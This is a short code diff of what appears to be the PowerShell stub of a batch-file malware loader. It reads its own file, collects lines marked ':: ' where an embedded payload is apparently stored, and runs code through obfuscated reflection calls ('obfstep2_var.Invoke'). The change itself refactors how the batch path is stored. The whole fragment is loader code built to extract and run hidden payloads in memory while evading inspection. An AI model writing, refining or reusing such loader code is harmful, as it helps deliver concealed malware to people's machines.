@@ -31,9 +31,9 @@ function execute_function($param_var,$param2_var)
 	$obfstep2_var.Invoke($null, $param2_var);
 }
 
-$host.UI.RawUI.WindowTitle = '%~f0';
-
-$contents_var=[System.IO.File]::ReadAllText('%~f0').Split([Environment]::NewLine);
+$batPath_var = '%~f0';
+$host.UI.RawUI.WindowTitle = $batPath_var;
+$contents_var=[System.IO.File]::ReadAllText($batPath_var).Split([Environment]::NewLine);
 foreach ($line_var in $contents_var) 
 {
 	if ($line_var.StartsWith(':: '))
